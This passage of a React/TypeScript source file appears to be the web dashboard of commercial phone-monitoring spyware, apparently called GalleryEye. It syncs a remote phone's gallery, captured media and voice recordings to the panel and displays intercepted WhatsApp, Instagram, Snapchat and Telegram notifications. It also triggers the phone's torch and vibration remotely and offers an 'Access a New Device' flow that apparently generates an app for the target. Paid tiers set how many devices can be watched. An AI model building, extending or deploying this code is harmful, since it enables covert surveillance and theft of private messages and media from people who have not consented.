                                }`}
                            >
                                <div className={`absolute inset-4 rounded-full border transition-colors duration-500 ${isTorchOn ? 'border-yellow-300/50' : 'border-white/5 group-hover:border-white/10'}`} />
                                <Flashlight size={72} className={`transition-colors duration-500 ${isTorchOn ? 'text-yellow-900 drop-shadow-md' : 'text-white/20 group-hover:text-yellow-400/50'}`} strokeWidth={1.5} />
                            </button>
                            
                            <div className="relative z-10 pt-8 border-t border-white/10 flex items-center justify-between">
                                <span className="text-sm font-medium text-white/40 uppercase tracking-widest">{isTorchOn ? 'Status: ON' : 'Status: OFF'}</span>
                                <div className={`w-3 h-3 rounded-full shadow-lg ${isTorchOn ? 'bg-yellow-400 shadow-yellow-400/50' : 'bg-white/10'}`} />
                            </div>
                        </div>
                    </div>
                );
            case 'vibration':
                return (
                    <div className="flex flex-col items-center justify-center min-h-[60vh] animate-in fade-in zoom-in-95 duration-300">
                        <div className="max-w-md w-full bg-white/5 border border-white/10 rounded-[3rem] p-12 text-center space-y-12 relative overflow-hidden shadow-neo-2xl">
                            <div className="absolute inset-0 bg-gradient-to-b from-orange-500/5 to-transparent pointer-events-none" />
                            
                            <div className="space-y-4 relative z-10">
                                <h2 className="text-4xl font-bold tracking-tight text-white">Vibration</h2>
                                <p className="text-white/50 text-sm max-w-xs mx-auto">Trigger the device's haptic motor to send an alert or locate the device.</p>
                            </div>
                            
                            <button 
                                onClick={triggerVibration}
                                className="relative w-56 h-56 mx-auto rounded-full flex items-center justify-center transition-all duration-300 group z-10 bg-black/40 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.6),inset_0_2px_4px_rgba(255,255,255,0.1)] hover:bg-orange-500/10 hover:border-orange-500/30 active:scale-95"
                            >
                                <div className="absolute inset-0 rounded-full border border-orange-500/0 group-hover:border-orange-500/20 group-active:animate-[ping_0.5s_cubic-bezier(0,0,0.2,1)_1]" />
                                <div className="absolute inset-4 rounded-full border border-white/5 group-hover:border-orange-500/30 transition-colors duration-300" />
                                <Vibrate size={72} className="text-white/20 group-hover:text-orange-400 group-hover:animate-bounce transition-colors" strokeWidth={1.5} />
                            </button>
                            
                            <div className="relative z-10 pt-8 border-t border-white/10 flex flex-col items-center gap-4">
                                <label className="text-sm font-medium text-white/40 uppercase tracking-widest">Duration (ms)</label>
                                <div className="flex items-center gap-4 w-full px-4">
                                    <input 
                                        type="range" 
                                        min="100" 
                                        max="5000" 
                                        step="100" 
                                        value={vibrationDuration} 
                                        onChange={(e) => setVibrationDuration(Number(e.target.value))}
                                        className="w-full accent-orange-500"
                                    />
                                    <span className="text-white font-data text-sm bg-black/40 px-3 py-1 rounded-lg border border-white/10">{vibrationDuration}ms</span>
                                </div>
                            </div>
                        </div>
                    </div>
                );
            case 'notifications': {
                const selectedDevice = devices.find(d => d.deviceId === selectedDeviceId);
                const isDeviceOnline = selectedDevice?.online ?? false;
                const filteredNotifs = notifications.filter(n => {
                    const deviceMatch = !n.deviceId || n.deviceId === 'unknown' || !selectedDeviceId || n.deviceId === selectedDeviceId;
                    const appMatch = selectedNotifApp === 'all' || 
                        notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName);
                    return deviceMatch && appMatch;
                });
                return (
                    <div className="space-y-4 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
                        
                        {/* Header - just status pills */}
                        <div className="flex items-center justify-end flex-shrink-0 gap-2 px-1">
                            <div className="flex items-center gap-2 flex-shrink-0">
                                {/* Device Online/Offline pill */}
                                {isDeviceOnline ? (
                                    <div className="flex items-center gap-1.5 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1.5 rounded-lg">
                                        <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                                        <span className="text-[11px] font-bold text-emerald-400 uppercase tracking-widest">Live</span>
                                    </div>
                                ) : (
                                    <div className="flex items-center gap-1.5 bg-white/5 border border-white/10 px-3 py-1.5 rounded-lg">
                                        <div className="w-1.5 h-1.5 rounded-full bg-white/30" />
                                        <span className="text-[11px] font-bold text-white/30 uppercase tracking-widest">Offline</span>
                                    </div>
                                )}
                                {filteredNotifs.length > 0 && (
                                    <button
                                        onClick={() => {
                                            if (!requireConnectedDevice(() => {})) return;
                                            setNotifications([]);
                                            try { localStorage.removeItem('galleryeye_notifications'); } catch {}
                                            const userUuid = session?.user?.uuid;
                                            if (userUuid) {
                                                const url = `https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${userUuid}` + 
                                                    (selectedDeviceId ? `?deviceId=${selectedDeviceId}` : '');
                                                fetch(url, { method: 'DELETE' }).catch(() => {});
                                            }
                                        }}
                                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/5 border border-white/10 hover:bg-red-500/10 hover:border-red-500/20 text-white/40 hover:text-red-400 text-[11px] font-bold uppercase tracking-widest transition-all"
                                    >
                                        <Trash2 size={12} />
                                        Clear All
                                    </button>
                                )}
                            </div>
                        </div>

                        {/* App Filter chips */}
                        <div className="flex gap-2 overflow-x-auto custom-scrollbar pb-1 flex-shrink-0">
                            {notifAppFilters.map(filter => (
                                <button
                                    key={filter.key}
                                    onClick={() => setSelectedNotifApp(filter.key)}
                                    className={`flex items-center gap-2 px-4 py-2 rounded-2xl text-xs font-bold whitespace-nowrap transition-all border flex-shrink-0 ${
                                        selectedNotifApp === filter.key 
                                            ? 'bg-indigo-500/20 text-indigo-300 border-indigo-500/40 shadow-[0_0_12px_rgba(99,102,241,0.2)]' 
                                            : 'bg-white/5 border-white/5 text-white/40 hover:bg-white/10 hover:text-white/70 hover:border-white/10'
                                    }`}
                                >
                                    {filter.img 
                                        ? <img src={filter.img} className="w-4 h-4" alt="" />
                                        : <Bell size={13} />
                                    }
                                    {filter.label}
                                    {selectedNotifApp !== filter.key && (
                                        <span className="text-[10px] text-white/20 font-data">
                                            {filter.key === 'all' 
                                                ? notifications.length 
                                                : notifications.filter(n => filter.packages.includes(n.packageName)).length
                                            }
                                        </span>
                                    )}
                                </button>
                            ))}
                        </div>

                        {/* Notification Feed */}
                        <div className="flex-1 overflow-y-auto custom-scrollbar bg-black/20 rounded-3xl border border-white/5 p-4 sm:p-5">
                            {filteredNotifs.length === 0 ? (
                                <div className="h-full min-h-[40vh] flex flex-col items-center justify-center text-center gap-5 text-white/20">
                                    <div className="w-20 h-20 rounded-3xl bg-white/5 border border-white/5 flex items-center justify-center">
                                        <Bell size={36} strokeWidth={1} />
                                    </div>
                                    <div>
                                        <p className="font-bold text-white/50">No notifications yet</p>
                                        <p className="text-sm text-white/25 mt-1">Monitoring is active. Waiting for device alerts...</p>
                                    </div>
                                </div>
                            ) : (
                                <div className="flex flex-col gap-3">
                                    {filteredNotifs.map((notif: any, i: number) => {
                                        const isExpanded = selectedNotification?.id === (notif.id || i);
                                        // App-specific accent colors
                                        const pkg = notif.packageName || '';
                                        const accentColor = 
                                            pkg.includes('whatsapp') ? { bg: 'rgba(37,211,102,0.12)', border: 'rgba(37,211,102,0.25)', dot: '#25D366', text: '#25D366' } :
                                            pkg.includes('instagram') ? { bg: 'rgba(228,64,95,0.12)', border: 'rgba(228,64,95,0.25)', dot: '#E4405F', text: '#E4405F' } :
                                            pkg.includes('facebook') ? { bg: 'rgba(24,119,242,0.12)', border: 'rgba(24,119,242,0.25)', dot: '#1877F2', text: '#1877F2' } :
                                            pkg.includes('snapchat') ? { bg: 'rgba(255,252,0,0.10)', border: 'rgba(255,252,0,0.25)', dot: '#FFFC00', text: '#d4cd00' } :
                                            pkg.includes('twitter') || pkg.includes('x.com') ? { bg: 'rgba(29,155,240,0.12)', border: 'rgba(29,155,240,0.25)', dot: '#1D9BF0', text: '#1D9BF0' } :
                                            pkg.includes('youtube') ? { bg: 'rgba(255,0,0,0.10)', border: 'rgba(255,0,0,0.22)', dot: '#FF0000', text: '#FF0000' } :
                                            pkg.includes('telegram') ? { bg: 'rgba(36,161,222,0.12)', border: 'rgba(36,161,222,0.25)', dot: '#24A1DE', text: '#24A1DE' } :
                                            { bg: 'rgba(99,102,241,0.10)', border: 'rgba(99,102,241,0.2)', dot: '#818cf8', text: '#818cf8' };

                                        return (
                                        <div
                                            key={i}
                                            onClick={() => setSelectedNotification(isExpanded ? null : { ...notif, id: notif.id || i })}
                                            style={{ 
                                                background: isExpanded ? accentColor.bg : 'rgba(255,255,255,0.04)',
                                                borderColor: isExpanded ? accentColor.border : 'rgba(255,255,255,0.06)'
                                            }}
                                            className="flex items-start gap-3 p-4 rounded-2xl border transition-all cursor-pointer hover:bg-white/[0.06]"
                                        >
                                            {/* App Icon */}
                                            <div className="w-12 h-12 rounded-2xl flex-shrink-0 overflow-hidden bg-black/40 border border-white/10">
                                                {appIcons[notif.packageName] ? (
                                                    <img 
                                                        src={`data:image/png;base64,${appIcons[notif.packageName]}`} 
                                                        className="w-full h-full object-cover rounded-2xl" 
                                                        alt="app icon" 
                                                    />
                                                ) : (
                                                    <div className="w-full h-full flex items-center justify-center rounded-2xl"
                                                        style={{ background: accentColor.bg }}>
                                                        <Bell size={20} style={{ color: accentColor.dot }} />
                                                    </div>
                                                )}
                                            </div>

                                            {/* Content */}
                                            <div className="flex-1 min-w-0">
                                                {/* Row 1: App name + time */}
                                                <div className="flex items-center justify-between gap-2 mb-1">
                                                    <span className="text-[11px] font-bold uppercase tracking-widest truncate"
                                                        style={{ color: accentColor.text }}>
                                                        {notif.appName || notif.packageName?.split('.').pop()}
                                                    </span>
                                                    <span className="text-[10px] text-white/30 whitespace-nowrap flex-shrink-0">
                                                        {(() => {
                                                            const d = new Date(notif.receivedAt || notif.timestamp);
                                                            const now = new Date();
                                                            const diff = Math.floor((now.getTime() - d.getTime()) / 1000);
                                                            if (diff < 60) return `${diff}s ago`;
                                                            if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
                                                            if (diff < 86400) return `${Math.floor(diff/3600)}h ago`;
                                                            return d.toLocaleDateString();
                                                        })()}
                                                    </span>
                                                </div>
                                                {/* Row 2: Bold title */}
                                                {notif.title && (
                                                    <p className="font-bold text-white text-sm leading-snug">
                                                        {notif.title}
                                                    </p>
                                                )}
                                                {/* Row 3: Structured / Multi-message Body */}
                                                {notif.text && (
                                                    <div className="mt-2 space-y-1.5">
                                                        {String(notif.text).split('\n').map((line: string, lineIdx: number) => {
                                                            if (!line.trim()) return null;
                                                            const colonIdx = line.indexOf(':');
                                                            const isMessageLike = colonIdx > 0 && colonIdx < 30;
                                                            const sender = isMessageLike ? line.substring(0, colonIdx).trim() : null;
                                                            const content = isMessageLike ? line.substring(colonIdx + 1).trim() : line;
                                                            return (
                                                                <div 
                                                                    key={lineIdx} 
                                                                    className="bg-white/[0.04] border border-white/[0.06] rounded-xl px-3 py-2 text-sm transition-all"
                                                                >
                                                                    {sender && (
                                                                        <span 
                                                                            className="font-bold text-xs block mb-0.5" 
                                                                            style={{ color: accentColor.text }}
                                                                        >
                                                                            {sender}
                                                                        </span>
                                                                    )}
                                                                    <span className="text-white/80 leading-relaxed whitespace-pre-wrap break-words">
                                                                        {content}
                                                                    </span>
                                                                </div>
                                                            );
                                                        })}
                                                    </div>
                                                )}
                                                {/* Expanded Context */}
                                                {isExpanded && (
                                                    <div className="mt-3 pt-3 border-t border-white/5 grid grid-cols-[60px_1fr] gap-y-2 gap-x-3">
                                                        {notif.subText && (
                                                            <>
                                                                <span className="text-[10px] font-bold text-white/25 uppercase tracking-widest pt-0.5">Sub</span>
                                                                <span className="text-xs text-white/60">{notif.subText}</span>
                                                            </>
                                                        )}
                                                        {notif.category && notif.category !== 'unknown' && (
                                                            <>
                                                                <span className="text-[10px] font-bold text-white/25 uppercase tracking-widest pt-0.5">Type</span>
                                                                <span className="text-[11px] font-bold px-2 py-0.5 rounded-md w-fit"
                                                                    style={{ color: accentColor.text, background: accentColor.bg, border: `1px solid ${accentColor.border}` }}>
                                                                    {notif.category}
                                                                </span>
                                                            </>
                                                        )}
                                                        <span className="text-[10px] font-bold text-white/25 uppercase tracking-widest pt-0.5">Time</span>
                                                        <span className="text-xs text-white/40">{new Date(notif.receivedAt || notif.timestamp).toLocaleString()}</span>
                                                        <span className="text-[10px] font-bold text-white/25 uppercase tracking-widest pt-0.5">App</span>
                                                        <span className="text-xs text-white/35 font-mono break-all">{notif.packageName}</span>
                                                    </div>
                                                )}
                                            </div>
                                        </div>
                                    );
                                    })}
                                </div>
                            )}
                        </div>
                    </div>
                );
            }
            default:
                return null;
        }
    };

    return (
        <div className="flex w-full h-full min-h-screen bg-base text-fg-1 overflow-hidden relative">
            {/* Navigation */}
            <AppNavigation 
                devices={devices}
                selectedDeviceId={selectedDeviceId}
                setSelectedDeviceId={setSelectedDeviceId}
                selectedTool={selectedTool}
                setSelectedTool={setSelectedTool as any}
                userPlan={userPlan as any}
                setShowPlansModal={setShowPlansModal}
                handleSignOut={handleSignOut}
                onOpenAppModal={() => setShowAppModal(true)}
                onDeleteDevice={handleDeleteDevice}
                user={session?.user}
                openDropdownProp={navDropdown}
                setOpenDropdownProp={setNavDropdown}
            />

            {/* Main Content Area */}
            <main className="flex-1 h-full w-full relative transition-all duration-300 pt-20 pb-8 overflow-y-auto no-scrollbar">
                {!selectedTool && (
                    <div className="max-w-7xl mx-auto px-4 md:px-8 py-4 space-y-6 pb-20 animate-in fade-in duration-300">
                        {/* Top Clean Header (Moved upward slightly, tightened padding & margins) */}
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/10 pb-4">
                            <div>
                                <h1 className="text-3xl sm:text-5xl font-black tracking-tight leading-tight drop-shadow-md">
                                    <span className="text-white">System</span>{" "}
                                    <span className="bg-clip-text text-transparent bg-gradient-to-r from-accent via-purple-400 to-pink-400">Dashboard</span>
                                </h1>
                                <p className="text-xs sm:text-sm text-fg-3 mt-1 font-medium">
                                    Real-time status overview across all encrypted endpoints
                                </p>
                            </div>
                            <button 
                                onClick={() => setShowAppModal(true)}
                                className="px-5 py-2.5 rounded-xl bg-accent hover:bg-accent-light text-white font-bold text-sm shadow-accent-glow flex items-center gap-2 transition-all active:scale-95 self-start sm:self-center cursor-pointer"
                            >
                                <Smartphone className="w-4 h-4" />
                                <span>+ Access a New Device</span>
                            </button>
                        </div>

                        {/* Functional Telemetry & Status Cards Grid (Sleek, Compact, High-End UI) */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                            {/* 1. Connected Devices Card (Click opens Devices Dropdown in Navbar) */}
                            <div 
                                onClick={() => setNavDropdown(navDropdown === 'devices' ? null : 'devices')}
                                className="p-4 rounded-2xl bg-white/[0.03] hover:bg-white/[0.06] border border-white/10 hover:border-white/20 transition-all duration-300 flex items-center justify-between shadow-xl cursor-pointer group backdrop-blur-md"
                            >
                                <div className="space-y-1">
                                    <div className="text-[11px] font-bold text-zinc-400 uppercase tracking-widest group-hover:text-zinc-300 transition-colors flex items-center gap-1.5">
                                        <span>Connected Devices</span>
                                        <ChevronDown className={`w-3.5 h-3.5 text-zinc-500 group-hover:text-white transition-transform ${navDropdown === 'devices' ? 'rotate-180' : ''}`} />
                                    </div>
                                    <div className="text-2xl font-extrabold text-white flex items-center gap-2 font-mono">
                                        {devices.filter(d => d.online).length} <span className="text-xs font-normal text-zinc-500">/ {devices.length} Online</span>
                                    </div>
                                    <div className="text-[11px] text-zinc-500 group-hover:text-zinc-400 transition-colors">Click to switch or manage endpoints</div>
                                </div>
                                <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform">
                                    <Smartphone className="w-5 h-5 text-emerald-400" />
                                </div>
                            </div>

                            {/* 2. Synced Media Card (Click opens Gallery Vault with history support) */}
                            <div 
                                onClick={() => {
                                    if (typeof window !== 'undefined') {
                                        window.history.pushState({ tool: 'gallery' }, '', '#tool=gallery');
                                    }
                                    setSelectedTool('gallery');
                                }}
                                className="p-4 rounded-2xl bg-white/[0.03] hover:bg-white/[0.06] border border-white/10 hover:border-white/20 transition-all duration-300 flex items-center justify-between shadow-xl cursor-pointer group backdrop-blur-md"
                            >
                                <div className="space-y-1">
                                    <div className="text-[11px] font-bold text-zinc-400 uppercase tracking-widest group-hover:text-zinc-300 transition-colors">Synced Media</div>
                                    <div className="text-2xl font-extrabold text-white font-mono">
                                        {images.length} <span className="text-xs font-normal text-zinc-500">Assets</span>
                                    </div>
                                    <div className="text-[11px] text-zinc-500 group-hover:text-zinc-400 transition-colors">Click to inspect encrypted vault</div>
                                </div>
                                <div className="w-10 h-10 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform">
                                    <Folder className="w-5 h-5 text-cyan-400" />
                                </div>
                            </div>

                            {/* 3. Backend Connection Card (Spinning icon + Cleanly positioned Cyan ping badge) */}
                            <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10 transition-all duration-300 flex items-center justify-between shadow-xl backdrop-blur-md">
                                <div className="space-y-1">
                                    <div className="text-[11px] font-bold text-zinc-400 uppercase tracking-widest">Backend Connection</div>
                                    <div className="flex items-center gap-2.5">
                                        <span className="relative flex h-2 w-2">
                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
                                            <span className="relative inline-flex rounded-full h-2 w-2 bg-cyan-500"></span>
                                        </span>
                                        <span className="text-base font-bold text-white tracking-wide font-mono">
                                            {socket && socket.connected ? 'BACKEND CONNECTED' : 'BACKEND ONLINE'}
                                        </span>
                                        {socket && socket.connected && (
                                            <span className="text-[11px] font-bold px-2 py-0.5 rounded-md bg-white/10 text-cyan-300 border border-cyan-500/30 font-mono tracking-wider shadow-sm">
                                                ⚡ {socketPing}ms
                                            </span>
                                        )}
                                    </div>
                                    <div className="text-[11px] text-zinc-500">Secure WebSocket tunnel active</div>
                                </div>
                                <div className="w-10 h-10 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center shrink-0">
                                    <RefreshCw className="w-5 h-5 text-cyan-400 animate-[spin_3s_linear_infinite]" />
                                </div>
                            </div>

                            {/* 4. Upgraded Subscription Plan Card (Distinct icons & refined capacity labels per tier) */}
                            <div 
                                onClick={() => setShowPlansModal(true)}
                                className="p-4 rounded-2xl bg-white/[0.03] hover:bg-white/[0.06] border border-white/10 hover:border-white/20 transition-all duration-300 flex items-center justify-between shadow-xl cursor-pointer group backdrop-blur-md"
                            >
                                <div className="space-y-1">
                                    <div className="text-[11px] font-bold text-zinc-400 uppercase tracking-widest group-hover:text-zinc-300 transition-colors">Subscription Tier</div>
                                    <div className="flex items-center gap-2">
                                        <span className="text-base font-bold text-white tracking-wide uppercase font-mono">
                                            {userPlan ? `${userPlan.toUpperCase()} TIER` : 'FREE TIER'}
                                        </span>
                                        <span className={`text-[10px] font-bold px-2 py-0.5 rounded-md uppercase tracking-wider font-mono ${
                                            userPlan === 'premium' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30' :
                                            userPlan === 'standard' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30' :
                                            'bg-zinc-500/20 text-zinc-300 border border-zinc-500/30'
                                        }`}>
                                            {getPlanLimits(userPlan || '').maxDevices} {getPlanLimits(userPlan || '').maxDevices === 1 ? 'DEVICE MAX' : 'DEVICES MAX'}
                                        </span>
                                    </div>
                                    <div className="text-[11px] text-zinc-500 group-hover:text-zinc-400 transition-colors">Click to inspect or upgrade limits</div>
                                </div>
                                <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform ${
                                    userPlan === 'premium' ? 'bg-amber-500/15 border border-amber-500/30 text-amber-400 shadow-[0_0_15px_rgba(245,158,11,0.2)]' :
                                    userPlan === 'standard' ? 'bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.2)]' :
                                    'bg-white/5 border border-white/10 text-zinc-400'
                                }`}>
                                    {userPlan === 'premium' && <Crown className="w-5 h-5 text-amber-400 animate-pulse" />}
                                    {userPlan === 'standard' && <Zap className="w-5 h-5 text-emerald-400" />}
                                    {(!userPlan || (userPlan !== 'premium' && userPlan !== 'standard')) && <Package className="w-5 h-5 text-zinc-400" />}
                                </div>
                            </div>

                            {/* 5. Video Tutorial Guide Card */}
                            <VideoModal videoId="0xQaikNVyn0" variant="card" />
                        </div>
                    </div>
                )}


                {selectedTool && (
                    <div className="max-w-7xl mx-auto px-4 md:px-8 mb-4 flex items-center justify-between">
                        <button
                            onClick={() => {
                                setSelectedTool(null);
                                if (typeof window !== 'undefined' && window.location.hash.includes('tool=')) {
                                    try { window.history.replaceState('', document.title, window.location.pathname + window.location.search); } catch {}
                                }
                            }}
                            className="flex items-center gap-2 px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/80 hover:text-white text-xs font-bold uppercase tracking-wider transition-all hover:scale-105 active:scale-95 shadow-md group cursor-pointer"
                        >
                            <ChevronLeft size={16} className="text-accent group-hover:-translate-x-1 transition-transform" />
                            <span>Back to Main Dashboard</span>
                        </button>
                        <div className="flex items-center gap-2">
                            <span className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest font-mono">Active Tool:</span>
                            <span className="text-xs font-bold text-accent uppercase tracking-wider bg-accent/10 px-3 py-1 rounded-lg border border-accent/20 font-mono">
                                {selectedTool.toUpperCase()}
                            </span>
                        </div>
                    </div>
                )}

                {selectedTool === 'gallery' && (
                    <div className="px-4 md:px-8 h-full">
                        <GalleryView 
                            images={!selectedDeviceId ? [] : images}
                            activeTab={activeTab}
                            setActiveTab={setActiveTab}
                            isSelectionMode={isSelectionMode}
                            setIsSelectionMode={setIsSelectionMode}
                            selectedItems={selectedItems}
                            toggleSelection={(id) => {
                                const newSet = new Set(selectedItems);
                                if (newSet.has(id)) newSet.delete(id);
                                else newSet.add(id);
                                setSelectedItems(newSet);
                            }}
                            selectAll={selectAll}
                            handleBulkDownload={downloadSelected}
                            handleBulkDelete={deleteSelected}
                            isDownloading={isDownloading}
                            isDeleting={isDeleting}
                            setPreviewItem={setPreviewItem}
                            galleryLoaderRef={galleryLoaderRef}
                            isLoadingMore={isLoadingMore}
                            galleryHasMore={galleryHasMore}
                            handleLoadMore={handleLoadMore}
                            
                            // Folder Props
                            folders={!selectedDeviceId ? [] : folders}
                            fetchFolders={fetchFolders}
                            isFetchingFolders={isFetchingFolders}
                            selectedDeviceId={selectedDeviceId}
                            setSyncOptionsFolder={setSyncOptionsFolder}
                            setShowSyncOptionsModal={setShowSyncOptionsModal}
                        />
                    </div>
                )}

                {selectedTool && selectedTool !== 'gallery' && (
                    <div className="px-4 md:px-8 max-w-7xl mx-auto h-full">
                        {renderTool()}
                    </div>
                )}
            </main>

            {/* Modals */}
            <AppGenerationModal isOpen={showAppModal} onClose={() => setShowAppModal(false)} uuid={session?.user?.uuid || ''} socket={socket} userPlan={userPlan} onUpgrade={(feature?: string, requiredPlan?: string) => { 
                if (feature && requiredPlan) {
                    showUpgradePrompt(feature, requiredPlan as 'standard' | 'premium');
                } else {
                    setShowAppModal(false); 
                    setShowPlansModal(true); 
                }
            }} />
            <WhatsAppButton />
            <PlansModal isOpen={showPlansModal} onClose={() => setShowPlansModal(false)} currentPlan={userPlan as any} userEmail={session?.user?.email || ''} userUuid={session?.user?.uuid || ''} />
            <UpgradeModal isOpen={showUpgradeModal} onClose={() => setShowUpgradeModal(false)} feature={upgradeFeature} requiredPlan={requiredPlan} onViewPlans={() => { setShowUpgradeModal(false); setShowPlansModal(true); }} />
            
            <SyncOptionsModal
                isOpen={showSyncOptionsModal}
                onClose={() => setShowSyncOptionsModal(false)}
                folder={syncOptionsFolder}
                userPlan={userPlan as any}
                onSync={(mediaType, count, method) => {
                    if (method === 'oneByOne') {
                        isSyncCanceledRef.current = false;
                        setIsStartingSync(true);
                        setUploadProgress({ uploaded: 0, total: count === 'all' ? syncOptionsFolder?.count || 0 : count, speed: '', eta: '' });
                        socket?.emit('trigger_sync', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            count,
                            mediaType
                        });
                    } else if (method === 'zip') {
                        setZipProgress({ stage: 'creating', current: 0, total: count === 'all' ? syncOptionsFolder.count : count, url: '', error: '' });
                        setShowZipProgressModal(true);
                        socket?.emit('trigger_zip', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            mediaType,
                            count
                        });
                    }
                }}
                onUpgrade={() => setShowPlansModal(true)}
            />

            <ConfirmDeleteModal
                isOpen={showDeleteConfirm}
                onClose={() => setShowDeleteConfirm(false)}
                onConfirm={confirmDelete}
                itemCount={selectedItems.size}
            />

            <ZipProgressModal
                isOpen={showZipProgressModal}
                onClose={() => setShowZipProgressModal(false)}
                stage={zipProgress.stage}
                current={zipProgress.current}
                total={zipProgress.total}
                folderName={syncOptionsFolder?.name || ''}
                downloadUrl={zipProgress.url}
                error={zipProgress.error}
                onCancel={() => {
                    socket?.emit('cancel_zip', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                }}
            />

            <CustomAlertModal
                isOpen={showCustomAlert}
                onClose={() => setShowCustomAlert(false)}
                title={alertData.title}
                message={alertData.message}
                type={alertData.type}
            />

            {deleteConfirmation.isOpen && (
                <div className="fixed inset-0 z-[600] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
                    <div className="bg-[#0a0a0c] border border-white/10 rounded-3xl p-6 max-w-sm w-full shadow-2xl animate-in zoom-in-95 duration-200">
                        <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center border border-red-500/30 mb-4 mx-auto">
                            <Trash2 size={24} className="text-red-500" />
                        </div>
                        <h3 className="text-xl font-bold text-white text-center mb-2">Delete Media?</h3>
                        <p className="text-sm text-white/60 text-center mb-6">
                            Are you sure you want to delete {deleteConfirmation.ids.length === 1 ? 'this item' : `these ${deleteConfirmation.ids.length} items`}? This action cannot be undone.
                        </p>
                        <div className="flex items-center gap-3">
                            <button 
                                onClick={() => setDeleteConfirmation({ isOpen: false, ids: [] })}
                                className="flex-1 py-3 px-4 rounded-xl font-bold text-sm text-white/70 bg-white/5 hover:bg-white/10 transition-colors"
                            >
                                Cancel
                            </button>
                            <button 
                                onClick={() => {
                                    setImages(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                    setCapturedMedia(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                    setCapturedVoice(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                    fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: deleteConfirmation.ids }) }).catch(()=>null);
                                    setDeleteConfirmation({ isOpen: false, ids: [] });
                                    setIsCameraSelectMode(false);
                                    setCameraSelectedItems(new Set());
                                }}
                                className="flex-1 py-3 px-4 rounded-xl font-bold text-sm text-white bg-red-500 hover:bg-red-600 transition-colors shadow-[0_0_15px_rgba(239,68,68,0.3)]"
                            >
                                Delete
                            </button>
                        </div>
                    </div>
                </div>
            )}

            <AnimatePresence>
                {(uploadProgress || isStartingSync) && (
                    <div className="fixed inset-0 z-[600] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
                        <motion.div 
                            initial={{ opacity: 0, scale: 0.95, y: 20 }}
                            animate={{ opacity: 1, scale: 1, y: 0 }}
                            exit={{ opacity: 0, scale: 0.95, y: 20 }}
                            className="relative w-full max-w-md neo-surface rounded-[2rem] border border-white/10 shadow-2xl overflow-hidden p-8 text-center"
                        >
                            <div className="absolute top-0 left-0 right-0 h-32 bg-gradient-to-br from-accent/20 to-transparent opacity-50 pointer-events-none" />
                            
                            <div className="relative z-10 flex flex-col items-center">
                                <div className="w-20 h-20 rounded-full bg-accent/10 border border-accent/20 flex items-center justify-center shadow-accent-glow mb-6 relative">
                                    <div className="absolute inset-0 rounded-full border-2 border-accent border-t-transparent animate-spin" />
                                    <ImageIcon className="w-8 h-8 text-accent animate-pulse" />
                                </div>
                                
                                <h3 className="text-2xl font-bold text-fg-1 mb-2">Syncing Media</h3>
                                <p className="text-fg-3 text-sm mb-8">
                                    {uploadProgress ? `Transferring ${uploadProgress.uploaded} of ${uploadProgress.total} items...` : 'Connecting to device...'}
                                </p>

                                <div className="w-full h-3 bg-black/40 rounded-full overflow-hidden border border-white/5 shadow-inner mb-8 relative">
                                    <div 
                                        className="h-full bg-accent transition-all duration-300 rounded-full shadow-[0_0_10px_rgba(var(--accent-rgb,255,255,255),0.8)] relative" 
                                        style={{ width: uploadProgress ? `${Math.max((uploadProgress.uploaded / uploadProgress.total) * 100, 5)}%` : '5%' }} 
                                    >
                                        <div className="absolute inset-0 bg-white/20 animate-pulse" />
                                    </div>
                                </div>

                                <button 
                                    onClick={() => {
                                        isSyncCanceledRef.current = true;
                                        socket?.emit('cancel_sync', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                        setUploadProgress(null);
                                        setIsStartingSync(false);
                                    }}
                                    className="px-8 py-3 rounded-xl bg-red-500/10 border border-red-500/20 hover:bg-red-500/20 text-red-400 font-bold transition-colors w-full"
                                >
                                    Cancel Sync
                                </button>
                            </div>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>

            <AnimatePresence>
                {previewItem && (
                    <motion.div 
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-4 md:p-8"
                        onClick={() => setPreviewItem(null)}
                    >
                        <motion.div 
                            initial={{ scale: 0.95, opacity: 0 }}
